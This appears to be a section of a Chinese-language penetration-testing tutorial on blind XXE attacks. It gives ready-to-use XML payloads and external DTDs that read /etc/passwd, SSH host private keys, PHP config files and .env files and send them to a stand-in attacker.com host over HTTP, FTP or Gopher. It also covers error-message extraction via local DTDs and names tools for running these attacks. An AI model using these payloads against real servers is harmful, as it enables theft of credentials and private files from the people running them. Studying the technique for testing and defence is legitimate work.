## 三、Blind XXE 与 OOB 外带及文件内容提取高级技巧

### 3.1 参数实体基础与 OOB 检测
```xml
<!-- 参数实体（%）只能在 DTD 内引用；外部 DTD 中可"参数实体引用参数实体"，
     内部 DTD 中大部分解析器禁止 —— 因此 OOB 必须拆分到外部 DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root/>
```

### 3.2 外部 DTD 数据外带（经典三件套）
**attacker.com/xxe.dtd：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;
```
**发送到目标的 payload：**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root/>
```
**原理**：`%eval;` 动态声明参数实体 `send`，`send` 的 SYSTEM URL 中拼入 `%file;`（文件内容），触发时向攻击者 HTTP 服务发送 GET 请求，文件内容出现在 `?data=` 参数中。
**限制**：文件内容不能含 `&`、`%` 等会破坏 URL/实体的字符，且 URL 长度有限 → 见 3.3 CDATA 与 3.5 错误盲提取。

### 3.3 CDATA 包装（提取含 XML 特殊字符的文件）
```xml
<!-- 服务端 payload -->
<?xml version="1.0"?>
<!DOCTYPE roottag [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root><![CDATA[&all;]]></root>

<!-- attacker.com/xxe.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%start;%file;%end;'>">
%all;
```
**原理**：把文件内容包进 `<![CDATA[...]]>`，`<`、`&` 等字符变为纯文本，不再破坏 XML/URL。

### 3.4 外带通道选择矩阵
| 通道 | 适用场景 | 工具 | 优点 | 缺点 |
|------|---------|------|------|------|
| HTTP GET | 通用，文件为单行文本 | Burp Collaborator / Interactsh | 简单可靠 | 文件内容需 URL 编码；多行文件会断 |
| FTP | 通用（Java 首选） | XXEinjector --oob=ftp / xxeserv | 支持多行文件 | 需 21 端口可入 |
| Gopher | Java ≤1.7 | XXEinjector --oob=gopher / Gopherus | 任意 TCP 构造请求 | 版本限制 |
| DNS | 文件内容极短或无外带通道 | Interactsh 子域名拼接 | 只依赖 DNS | 只适合短内容/布尔探测 |
| **错误消息** | **无出网/防火墙严** | dtd-finder | **完全不需要攻击者服务器** | 需错误信息回显（见 3.5）|

### 3.5 错误消息盲提取（重点：无出网场景的王牌）
**思路**：把文件内容拼进一个必然报错的 URL/DTD，让解析器把"带文件内容的错误信息"回显到响应中。

**3.5.1 外部 DTD 错误变体（需出网加载 DTD）：**
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**3.5.2 本地 DTD 技巧（完全无出网，Java 平台神器）：**
利用目标 Java 环境/JAR 包内**自带的本地 DTD 文件**（含可被重新定义的参数实体），配合"内部 DTD 重新定义外部 DTD 实体放宽参数实体嵌套限制"的 W3C 规则（PortSwigger 技巧）：
```xml
<!-- 原理：内部 DTD 引用了外部(local) DTD，且内部重新定义了其中实体 → 参数实体中可再引用参数实体 -->
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/java/xxx.dtd">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```
**打法**：先用 **GoSecure dtd-finder**（`java -jar dtd-finder.jar`）扫描目标 JVM 与依赖中可用的本地 DTD 文件（常见于 Java 安装目录、Web 容器 lib、应用依赖 JAR），自动生成对应 payload。

**3.5.3 混合 DTD（PortSwigger 明确收录）：**
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">
  <!ENTITY % condition 'aaa<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;>">%eval;%error;'>
  %condition;
]>
```

### 3.6 无法回显时的编码绕过与数据截断
```xml
<!-- php://filter base64 编码后外带（文件内容可能是二进制/特殊字符）-->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/config.php">

<!-- 文件过大时按字节截断外带（错误消息/外带通道均有长度限制）-->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!-- 配合 xpointer/字符串截断：只取文件前 N 字节逐段外带（利用错误消息逐字符盲注）-->
```

### 3.7 FTP 外带多行文件
```xml
<!-- 外部 DTD（FTP 通道，Java 解析器首选，多行文件不截断）-->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%send;
```
攻击端用 xxeserv/XXEinjector 起 FTP 监听，收到的文件内容按行分块存储。
**Gopher 变体（Java ≤1.7）**：`<!ENTITY xxe SYSTEM "gopher://attacker.com:port/_POST 数据">`，配合 Gopherus 构造内网 HTTP 请求。

### 3.8 二进制/非文本文件读取
```xml
<!-- 二进制文件（私钥、图片）直接外带会被截断/报错，需先编码：-->
<!-- PHP 平台：php://filter base64（见4.2）-->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/ssh/ssh_host_rsa_key">
<!-- Java 平台：配合 jar: 协议把二进制写入攻击者可读位置（XXEinjector --upload）-->
```
**经验**：`.git/config`、`.env`、`application.yml` 等文本文件优先；二进制目标（如 `id_rsa`）走 base64 编码通道。

